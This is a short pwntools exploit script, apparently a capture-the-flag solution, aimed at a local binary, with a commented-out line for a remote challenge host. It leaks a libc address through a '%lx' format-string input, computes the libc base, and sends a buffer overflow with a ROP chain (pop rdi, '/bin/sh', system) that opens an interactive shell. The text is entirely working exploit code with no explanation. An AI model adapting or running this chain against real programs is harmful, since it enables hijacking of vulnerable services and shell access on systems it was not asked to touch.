from pwn import *
context.arch = "amd64"

def exec_fmt(payload):
    io = process("./bin")
    io.sendline(payload)
    return io.recvall()

io = process("./bin")
# io = remote('0.cloud.chals.io', 22438)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
if args.GDB:
	gdb.attach(io)

io.sendlineafter(b'eye', b'%lx')
io.recvline()
leak = int(io.recvline()[:-1], 16)
info(f"leak is: {hex(leak)}")
libc.address = leak - 0x219b23
info(f"base is: {hex(libc.address)}")

rop = ROP(libc)
payload = b"A"*104
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.sym['system'])

io.sendlineafter(b'time', payload)

io.interactive()
